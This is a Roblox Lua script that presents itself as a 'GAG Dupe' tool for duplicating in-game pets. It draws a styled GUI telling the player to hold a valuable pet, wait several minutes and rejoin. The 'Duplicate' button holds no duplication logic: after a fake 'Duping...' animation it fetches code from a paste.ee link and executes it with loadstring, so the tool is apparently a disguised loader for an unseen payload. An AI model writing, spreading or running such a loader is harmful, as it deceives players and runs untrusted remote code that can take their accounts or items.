local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local playerGui = player:WaitForChild("PlayerGui")

local gui = Instance.new("ScreenGui")
gui.Name = "DuplicateToolGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 260, 0, 290)
frame.Position = UDim2.new(0.3, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 51)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.ZIndex = 1
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 163)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 30))
}
gradient.Rotation = 90
gradient.Parent = frame

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(0, 36, 0, 36)
avatar.Position = UDim2.new(0, 10, 0, 10)
avatar.BackgroundTransparency = 1
avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
avatar.ZIndex = 2
avatar.Parent = frame
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

local name = Instance.new("TextLabel")
name.Size = UDim2.new(0, 140, 0, 24)
name.Position = UDim2.new(0, 50, 0, 15)
name.BackgroundTransparency = 1
name.Text = player.Name
name.TextColor3 = Color3.new(1, 1, 1)
name.Font = Enum.Font.GothamMedium
name.TextSize = 16
name.TextXAlignment = Enum.TextXAlignment.Left
name.ZIndex = 2
name.Parent = frame

-- Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 28)
title.Position = UDim2.new(0, 10, 0, 40)
title.BackgroundTransparency = 1
title.Text = "GAG🌱 Dupe Updated"
title.TextColor3 = Color3.fromRGB(100, 255, 100)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 2
title.Parent = frame

-- Info label 1
local info1 = Instance.new("TextLabel")
info1.Size = UDim2.new(1, -20, 0, 24)
info1.Position = UDim2.new(0, 10, 0, 75)
info1.BackgroundTransparency = 1
info1.Text = "1. (HOLD THE DESIRED PET) Only works on RACCOON, DRAGONFLY, and RED FOX."
info1.TextColor3 = Color3.fromRGB(0, 220, 0)
info1.Font = Enum.Font.Gotham
info1.TextSize = 12
info1.TextWrapped = true
info1.TextXAlignment = Enum.TextXAlignment.Center
info1.ZIndex = 2
info1.Parent = frame

-- Info label 2
local info2 = Instance.new("TextLabel")
info2.Size = UDim2.new(1, -20, 0, 24)
info2.Position = UDim2.new(0, 10, 0, 110)
info2.BackgroundTransparency = 1
info2.Text = "2. (PUBLIC SERVER ONLY) 25% Chance to work. Willing to Rejoin and Re-execute."
info2.TextColor3 = Color3.fromRGB(255, 0, 0)
info2.Font = Enum.Font.Gotham
info2.TextSize = 12
info2.TextWrapped = true
info2.TextXAlignment = Enum.TextXAlignment.Center
info2.ZIndex = 2
info2.Parent = frame

-- Info label 3 (description)
local description = Instance.new("TextLabel")
description.Size = UDim2.new(1, -20, 0, 40)
description.Position = UDim2.new(0, 10, 0, 148)
description.BackgroundTransparency = 1
description.Text = "3. You have to wait for 3-5mins. After Initializing Complete, Rejoin the Server and the Duped pets should appear!"
description.TextColor3 = Color3.fromRGB(255, 255, 255)
description.Font = Enum.Font.Gotham
description.TextSize = 12
description.TextWrapped = true
description.TextXAlignment = Enum.TextXAlignment.Center
description.ZIndex = 2
description.Parent = frame

-- Duplicate button
local duplicateBtn = Instance.new("TextButton")
duplicateBtn.Size = UDim2.new(0, 180, 0, 40)
duplicateBtn.Position = UDim2.new(0.5, -90, 0, 210)
duplicateBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 100)
duplicateBtn.Text = "Duplicate"
duplicateBtn.TextSize = 20
duplicateBtn.TextColor3 = Color3.new(1, 1, 1)
duplicateBtn.Font = Enum.Font.GothamBold
duplicateBtn.AutoButtonColor = true
duplicateBtn.ZIndex = 2
duplicateBtn.Parent = frame
Instance.new("UICorner", duplicateBtn).CornerRadius = UDim.new(0, 10)

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 6)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.GothamBold
closeBtn.ZIndex = 2
closeBtn.Parent = frame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -10, 0, 18)
footer.Position = UDim2.new(0, 5, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "SUB TO YUraxYZ | Made by YUraxYZ"
footer.TextColor3 = Color3.fromRGB(255, 255, 255)
footer.Font = Enum.Font.Gotham
footer.TextSize = 13
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.ZIndex = 2
footer.Parent = frame

-- Close function
closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

-- Get Tool (unused but left for future)
local function getTool()
	for _, item in ipairs(character:GetChildren()) do
		if item:IsA("Tool") then
			return item
		end
	end
end

-- Duplicate button behavior
duplicateBtn.MouseButton1Click:Connect(function()
	duplicateBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	duplicateBtn.Text = "Duping"

	local dotCount = 0
	for i = 1, 9 do
		wait(0.5)
		dotCount = (dotCount % 3) + 1
		duplicateBtn.Text = "Duping" .. string.rep(".", dotCount)
	end

	loadstring(game:HttpGet("https://paste.ee/r/hHckBavN"))()
end)